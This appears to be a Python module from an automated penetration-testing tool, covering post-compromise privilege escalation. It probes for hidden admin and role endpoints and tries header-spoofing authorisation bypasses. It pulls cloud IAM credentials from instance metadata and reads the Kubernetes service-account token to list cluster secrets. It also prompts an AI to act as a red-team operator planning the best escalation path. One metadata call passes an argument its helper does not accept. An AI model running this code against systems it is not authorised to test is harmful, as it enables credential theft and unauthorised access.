"""
Phase 16 — Privilege Escalation

Once inside, never stop at initial access. Ask: "What trusts this compromised component?"

Three layers:
  Application — admin APIs, hidden roles, feature flags, internal endpoints
  Infrastructure — metadata IAM, K8s secrets, Docker daemon, CI/CD secrets
  Identity — OAuth token endpoints, JWT key discovery, session store access
"""
import json
import warnings
import urllib3
import requests
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore", category=urllib3.exceptions.InsecureRequestWarning)

_HEADERS = {"User-Agent": "Mozilla/5.0 (security-scanner)"}

# ---------------------------------------------------------------------------
# Application Layer — feature flags, hidden roles, internal admin APIs
# ---------------------------------------------------------------------------

_FEATURE_FLAG_PATHS = [
    "/api/feature-flags", "/api/features", "/api/flags",
    "/api/v1/feature-flags", "/api/v2/features",
    "/.well-known/feature-flags",
    "/admin/feature-flags", "/admin/features",
    "/api/experiments", "/api/toggles",
    "/api/unleash/client/features",     # Unleash
    "/api/sdk/environments/production", # LaunchDarkly
    "/api/v1/flags",                    # Flagsmith / GrowthBook
]

_HIDDEN_ROLE_PATHS = [
    "/api/roles", "/api/permissions", "/api/v1/roles",
    "/api/v2/permissions", "/api/users/roles",
    "/api/access-control", "/api/acl",
    "/api/grants", "/api/entitlements",
    "/admin/roles", "/admin/permissions",
    "/api/v1/users/promote", "/api/v1/users/elevate",
    "/api/admin/impersonate",
]

_INTERNAL_ENDPOINT_PATHS = [
    "/internal", "/internal/api", "/internal/admin",
    "/api/internal", "/api/internal/config",
    "/_internal", "/__internal__",
    "/api/ops", "/ops", "/operations",
    "/api/debug/users", "/debug/db",
    "/api/backdoor", "/api/test", "/api/dev",
    "/system", "/api/system", "/api/system/config",
]

_SENSITIVE_HEADERS_TO_TRY = [
    {"X-Internal-Request": "true"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Admin": "true"},
    {"X-Role": "admin"},
    {"X-User-Role": "superuser"},
    {"X-Bypass-Auth": "1"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
]


def _get(url: str, headers: dict = None, timeout: int = 5) -> requests.Response | None:
    try:
        return requests.get(
            url, headers={**_HEADERS, **(headers or {})},
            timeout=timeout, verify=False, allow_redirects=False,
        )
    except Exception:
        return None


def _probe_app_layer(base_url: str, auth_headers: dict = None) -> list[dict]:
    findings: list[dict] = []
    base = base_url.rstrip("/")
    hdrs = auth_headers or {}

    for path_group, label, severity in [
        (_FEATURE_FLAG_PATHS, "Feature flag endpoint",   "high"),
        (_HIDDEN_ROLE_PATHS,  "Hidden role/ACL endpoint", "critical"),
        (_INTERNAL_ENDPOINT_PATHS, "Internal admin endpoint", "critical"),
    ]:
        for path in path_group:
            url = base + path
            r   = _get(url, hdrs)
            if r and r.status_code in (200, 201, 206):
                findings.append({
                    "layer":    "application",
                    "issue":    f"{label}: {path}",
                    "severity": severity,
                    "owasp":    "A01",
                    "url":      url,
                    "status":   r.status_code,
                    "snippet":  r.text[:300],
                    "detail":   f"{label} {path} returned HTTP {r.status_code} — accessible with current session",
                })

    # Header-based access bypass attempts on known 403 paths
    bypass_targets = [base + p for p in ["/admin", "/api/admin", "/internal"]]
    for url in bypass_targets:
        baseline = _get(url, hdrs)
        if baseline and baseline.status_code in (200, 201):
            continue  # already accessible
        for extra_hdrs in _SENSITIVE_HEADERS_TO_TRY:
            r = _get(url, {**hdrs, **extra_hdrs})
            if r and r.status_code in (200, 201, 206):
                findings.append({
                    "layer":    "application",
                    "issue":    f"Header-based access bypass: {list(extra_hdrs.keys())[0]} → {url}",
                    "severity": "critical",
                    "owasp":    "A01",
                    "url":      url,
                    "bypass_header": extra_hdrs,
                    "status":   r.status_code,
                    "snippet":  r.text[:200],
                    "detail":   f"Access to {url} bypassed via {extra_hdrs}",
                })
                break

    return findings


# ---------------------------------------------------------------------------
# Infrastructure Layer — cloud IAM, Docker, K8s secrets
# ---------------------------------------------------------------------------

_CLOUD_IAM_PATHS = [
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/iam/info",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
]

_K8S_SECRET_PATHS = [
    "https://kubernetes.default.svc/api/v1/secrets",
    "https://kubernetes.default.svc/api/v1/namespaces/default/secrets",
    "https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets",
    "https://kubernetes.default.svc/api/v1/configmaps",
]


def _probe_infra_layer(pivot_data: dict) -> list[dict]:
    """Escalate from already-confirmed pivot findings."""
    findings: list[dict] = []

    # If cloud metadata was accessible, try to get actual credentials
    for cloud_finding in pivot_data.get("cloud", []):
        url = cloud_finding.get("url", "")
        if "iam" not in url.lower() and "credentials" not in url.lower():
            # Try the IAM credential URL
            for iam_url in _CLOUD_IAM_PATHS:
                r = _get(iam_url, extra_headers={"Metadata": "true", "Metadata-Flavor": "Google"} if "google" in iam_url else {"Metadata": "true"})
                if r and r.status_code == 200:
                    body = r.text
                    if any(k in body for k in ["AccessKeyId", "SecretAccessKey", "access_token", "token_type"]):
                        findings.append({
                            "layer":    "infrastructure",
                            "issue":    "Cloud IAM credentials retrieved via metadata",
                            "severity": "critical",
                            "owasp":    "A10",
                            "url":      iam_url,
                            "snippet":  body[:400],
                            "detail":   "Cloud IAM credentials (access key/token) accessible — use to enumerate cloud permissions",
                        })
                        break

    # If K8s API was found, try to list secrets
    for k8s_finding in pivot_data.get("container_k8s", []):
        if "kubernetes" not in k8s_finding.get("url", "").lower():
            continue
        # Get SA token if present
        sa_token = None
        try:
            with open("/var/run/secrets/kubernetes.io/serviceaccount/token") as f:
                sa_token = f.read().strip()
        except Exception:
            pass

        hdrs = {"Authorization": f"Bearer {sa_token}"} if sa_token else {}
        for secret_path in _K8S_SECRET_PATHS:
            r = _get(secret_path, {**hdrs}, timeout=4)
            if r and r.status_code in (200, 201):
                findings.append({
                    "layer":    "infrastructure",
                    "issue":    f"K8s secrets enumerable: {secret_path}",
                    "severity": "critical",
                    "owasp":    "A05",
                    "url":      secret_path,
                    "status":   r.status_code,
                    "snippet":  r.text[:400],
                    "detail":   "Kubernetes secret enumeration succeeded — may contain DB passwords, API keys, TLS certs",
                })
                break

    return findings


# ---------------------------------------------------------------------------
# Identity Layer — OAuth tokens, JWT JWKS, session stores
# ---------------------------------------------------------------------------

_JWKS_PATHS = [
    "/.well-known/jwks.json",
    "/oauth/.well-known/jwks.json",
    "/api/.well-known/jwks.json",
    "/.well-known/openid-configuration",
    "/api/auth/jwks",
    "/auth/keys",
    "/oauth/discovery/keys",
]

_OAUTH_TOKEN_PATHS = [
    "/oauth/token", "/api/oauth/token",
    "/api/v1/auth/token", "/api/v2/auth/token",
    "/api/token", "/api/auth/token",
    "/api/refresh", "/api/token/refresh",
    "/api/auth/refresh",
]

_SESSION_STORE_PORTS = [6379, 11211, 27017]   # Redis, Memcached, MongoDB


def _probe_identity_layer(base_url: str, auth_headers: dict = None) -> list[dict]:
    findings: list[dict] = []
    base  = base_url.rstrip("/")
    host  = urlparse(base_url).hostname or ""
    hdrs  = auth_headers or {}

    # JWKS key exposure
    for path in _JWKS_PATHS:
        url = base + path
        r   = _get(url)
        if r and r.status_code == 200:
            body = r.text
            if "keys" in body.lower() or "n\":" in body or "kty" in body:
                findings.append({
                    "layer":    "identity",
                    "issue":    f"JWT JWKS / signing key material exposed: {path}",
                    "severity": "high",
                    "owasp":    "A07",
                    "url":      url,
                    "snippet":  body[:400],
                    "detail":   (
                        "Public key material accessible — if HS256 is in use, "
                        "this enables algorithm confusion attacks"
                    ),
                })

    # OAuth token endpoint discovery (unauthenticated OPTIONS/GET)
    for path in _OAUTH_TOKEN_PATHS:
        url = base + path
        r   = _get(url)
        if r and r.status_code in (200, 400, 401, 405):
            # 400 usually means the endpoint exists but params are missing
            findings.append({
                "layer":    "identity",
                "issue":    f"OAuth/token endpoint discovered: {path} (HTTP {r.status_code})",
                "severity": "medium",
                "owasp":    "A07",
                "url":      url,
                "status":   r.status_code,
                "detail":   f"Token endpoint {path} exists — test for client_credentials grant, token reuse, refresh abuse",
            })

    # Refresh token abuse — try infinite refresh with a dummy token
    for path in _OAUTH_TOKEN_PATHS:
        if "refresh" not in path:
            continue
        url = base + path
        try:
            r1 = requests.post(
                url,
                json={"grant_type": "refresh_token", "refresh_token": "phantomai_probe_token"},
                headers={**_HEADERS, "Content-Type": "application/json"},
                timeout=5, verify=False, allow_redirects=False,
            )
            if r1.status_code not in (404, 405):
                findings.append({
                    "layer":    "identity",
                    "issue":    f"Refresh token endpoint responds to probe: {path}",
                    "severity": "medium",
                    "owasp":    "A07",
                    "url":      url,
                    "status":   r1.status_code,
                    "detail":   "Refresh endpoint accepts requests — test for token reuse, no-rotation, or missing revocation",
                })
        except Exception:
            pass

    return findings


# ---------------------------------------------------------------------------
# Main entry point
# ---------------------------------------------------------------------------

def run_escalation(
    target: str,
    pivot_data: dict = None,
    auth_headers: dict = None,
    ai=None,
) -> dict:
    base_url  = target if target.startswith("http") else f"https://{target}"
    pivot_data = pivot_data or {}

    print("    [*] Escalation: application layer (feature flags, hidden roles, bypass headers) ...")
    app_findings   = _probe_app_layer(base_url, auth_headers)

    print("    [*] Escalation: infrastructure layer (cloud IAM, K8s secrets) ...")
    infra_findings = _probe_infra_layer(pivot_data)

    print("    [*] Escalation: identity layer (JWKS, OAuth tokens, refresh abuse) ...")
    id_findings    = _probe_identity_layer(base_url, auth_headers)

    all_findings = app_findings + infra_findings + id_findings

    # AI synthesis
    ai_path = None
    if ai and ai.is_available() and all_findings:
        summary = json.dumps(
            [{"layer": f["layer"], "issue": f["issue"], "severity": f["severity"]}
             for f in all_findings[:15]],
            indent=2
        )[:2000]
        prompt = (
            "You are a red-team operator reviewing privilege escalation findings.\n\n"
            f"Target: {target}\n"
            f"Escalation findings:\n{summary}\n\n"
            "Identify:\n"
            "1. The single highest-impact escalation path (step by step)\n"
            "2. What level of access a successful escalation achieves\n"
            "3. What evidence must be captured to prove the escalation to the client\n\n"
            "Return ONLY valid JSON:\n"
            '{"escalation_path":["step1","step2","step3"], '
            '"access_level":"...", "evidence_required":"..."}'
        )
        ai_path = ai.ask_json(prompt, model="deep")

    critical = sum(1 for f in all_findings if f.get("severity") == "critical")
    high     = sum(1 for f in all_findings if f.get("severity") == "high")

    return {
        "application":  app_findings,
        "infrastructure": infra_findings,
        "identity":     id_findings,
        "all_findings": all_findings,
        "ai_path":      ai_path,
        "summary": {"total": len(all_findings), "critical": critical, "high": high},
    }
